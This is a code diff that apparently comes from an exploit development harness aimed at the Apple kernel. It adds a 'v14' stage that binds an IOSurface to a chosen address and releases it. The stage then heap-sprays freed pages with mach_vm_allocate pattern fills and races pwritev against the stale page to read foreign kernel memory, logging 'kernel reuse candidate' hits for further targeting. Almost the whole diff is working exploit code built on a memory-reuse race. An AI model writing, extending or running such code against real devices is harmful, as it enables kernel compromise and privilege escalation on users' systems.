@@ -977,11 +977,15 @@ static CFNumberRef RCNUM(int64_t v) {
         /* knob triage (calib): knob "v12" runs the whole-surface stage only;
            knob "v12.2" runs the mlock stage only; knob "v13" runs ONLY the
            purgeable feed (v12's stall at pre-write never reaches it);
+           knob "v14" runs ONLY the cs2-order spray-then-reread stage;
            unset/other runs both v12 stages */
         char knv[32];
-        BOOL g_runWhole = YES, g_runMlock = YES, g_runV13 = NO;
+        BOOL g_runWhole = YES, g_runMlock = YES, g_runV13 = NO, g_runV14 = NO;
         if (LabKnobRead("cscali", knv, (int)sizeof knv) == 1) {
             if (strncmp(knv, "v12.2", 5) == 0) g_runWhole = NO;
+            else if (strncmp(knv, "v14", 3) == 0) {
+                g_runWhole = NO; g_runMlock = NO; g_runV14 = YES;
+            }
             else if (strncmp(knv, "v13", 3) == 0) {
                 g_runWhole = NO; g_runMlock = NO; g_runV13 = YES;
             }
@@ -1324,6 +1328,123 @@ static CFNumberRef RCNUM(int64_t v) {
             } else if (vol13 && !restored13) {
                 LabBanditNote("cscali", "v13: volatile armed, restore kr!=0 — check before next tap");
             }
+        }
+    }
+
+    /* ---- v14 RECLAIM (cs2-order): the proven ClearSword pass shape,
+       adapted — bind->munlock->RECLAIM-SPRAY->re-race. Receipts law
+       (2026-11-15): the pre-write pwritev wedge fires when the race runs
+       against a window whose backing is freshly released (v12) or
+       freshly volatile (v13) — the copy path blocks on a page sitting on
+       a freelist/purge queue with a pending pager ref. cs2/poc.c never
+       races a page in that state: its munlock runs at pass END (memory
+       object already gone, nothing in flight) and no pass re-races the
+       freed page. So v14 never lets the page linger:
+         1. bind + prefetch + CFRelease ONE window (v12.2 move, exact)
+         2. IMMEDIATE VM reclaim-spray (mach_vm_allocate + vpat fill) so
+            the freed page lands in a LIVE mapping before anything
+            touches it
+         3. re-race ONLY that index through the unmodified choreography
+         4. cs2 pass-end order — free the spray holders first
+       No purgeable trap calls at all in this stage. PANIC-POSSIBLE;
+       solo tap; knob "v14". */
+    if (g_runV14) {
+        rc_log("--- v14 RECLAIM: bind->munlock->reclaim-spray->re-race (PANIC-POSSIBLE) ---");
+        uint64_t cand14[8]; uint32_t cand14N = 0;
+        for (uint32_t i = 0; i < rc_hotN && cand14N < 4; i++) cand14[cand14N++] = rc_hotOffs[i];
+        if (warmN && cand14N < 8) cand14[cand14N++] = rc_warm[warmN - 1];
+        uint64_t vpat = 0x1337C0DE12345678ULL, vpat2 = ~vpat;
+        uint32_t bound14 = 0, refused14 = 0, spray14 = 0, sprayOwn14 = 0, hits14 = 0, fpOurs14 = 0;
+        for (uint32_t ci = 0; ci < cand14N; ci++) {
+            uint64_t off = cand14[ci];
+            IOSurfaceRef s14 = NULL;
+            {
+                CFMutableDictionaryRef d14 = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(d14, CFSTR("IOSurfaceAddress"),
+                                     RCNUM((int64_t)(searchMap + off)));
+                CFDictionarySetValue(d14, CFSTR("IOSurfaceAllocSize"),
+                                     RCNUM((int64_t)vm_page_size));
+                s14 = pCreate((__bridge CFDictionaryRef)(__bridge NSDictionary *)d14);
+                CFRelease(d14);
+            }
+            if (!s14) {
+                refused14++;
+                if (ci == 0) rc_log("[v14] bind not honored (IOSurfaceAddress refused) — stage skipped");
+                continue;
+            }
+            bound14++;
+            if (pPrefetch) pPrefetch(s14);   /* v12.2 move: pin the window */
+            /* free exactly this window — nothing of ours is in flight */
+            CFRelease(s14);
+            /* step 2: the freed page goes to the NEXT allocator, not to a
+               purge-queue wedge */
+            uint32_t sprayGot = 0;
+            mach_vm_address_t spr14[64];
+            for (uint32_t k = 0; k < 64; k++) {
+                mach_vm_address_t am = 0;
+                kern_return_t krS = mach_vm_allocate(mach_task_self(), &am, 0x8000,
+                                                     VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
+                if (krS == KERN_SUCCESS) {
+                    uint64_t *w = (uint64_t *)am;
+                    for (uint32_t q = 0; q < (uint32_t)(0x8000 / 16); q++)
+                        { w[2 * q] = vpat; w[2 * q + 1] = vpat2; }
+                    spr14[sprayGot++] = am;
+                }
+            }
+            /* step 3: re-race ONLY this stale index, 25 iters */
+            uint32_t pg14 = (uint32_t)(off / vm_page_size);
+            for (int it14 = 0; it14 < 25; it14++) {
+                mach_vm_address_t a14 = pcBig;
+                mach_vm_map(mach_task_self(), &a14, 0x8000, 0,
+                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false,
+                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+                memset_pattern8((void *)pcBig, &m0, 0x8000);
+                pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+                struct iovec iov14 = { (void *)(pcBig + 0x3f00), 0x4000 };
+                rc_mapAddr = pcBig; rc_mapSize = 0x8000;
+                rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
+                if (it14 == 0) rc_log("[v14] window %u off=0x%llx pre-write",
+                                      ci, (unsigned long long)off);
+                rc_raceOn = 1;
+                pwritev(fdMark, &iov14, 1, 0x3f00);
+                while (rc_raceOn == 1);
+                if (it14 == 0) rc_log("[v14] window %u post-write", ci);
+                pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                uint64_t got14 = 0; int32_t dlt14 = 0;
+                rc_cls_t c14 = rc_cls(rbBuf, pg14 + 1, npages, &got14, &dlt14);
+                if (c14 == C_FOREIGN) {
+                    BOOL vp = NO, fp14 = NO;
+                    for (int q14 = 0; q14 < RC_NQ; q14++) {
+                        if (rbBuf[q14] == vpat || rbBuf[q14] == vpat2) { vp = YES; break; }
+                        if (rbBuf[q14] == m0 || rbBuf[q14] == M0_TAG) { fp14 = YES; break; }
+                    }
+                    if (vp) { sprayOwn14++; continue; }   /* the spray took our page back */
+                    if (fp14) { fpOurs14++; continue; }   /* still ours by tag */
+                    if (hits14 < 3) {
+                        hits14++;
+                        rc_log("  v14 FOREIGN off=0x%llx q0=0x%016llx q1=0x%016llx "
+                               "(sprayed-then-reread — kernel reuse candidate)",
+                               (unsigned long long)off, rbBuf[0], rbBuf[1]);
+                        rc_aim(rbBuf, c14, fdMark, off, vm_page_size, hmarker);
+                    }
+                }
+            }
+            /* step 4: cs2 pass-end order — spray holders die first */
+            for (uint32_t k = 0; k < sprayGot; k++)
+                mach_vm_deallocate(mach_task_self(), spr14[k], 0x8000);
+            spray14 += sprayGot;
+        }
+        rc_log("v14: bound=%u refused=%u sprayed=%u spray-own=%u fp-still-ours=%u hits=%u",
+               bound14, refused14, spray14, sprayOwn14, fpOurs14, hits14);
+        if (hits14 > 0) {
+            char fh14[24];
+            snprintf(fh14, sizeof fh14, "%u", hits14);
+            LabBanditFeat fe14[2] = { { "stage", "v14-cs2order" },
+                                      { "foreign", fh14 } };
+            LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
+                                LABB_SIG_FOREIGN, LABB_E_DEVICE, fe14, 2);
         }
     }
 
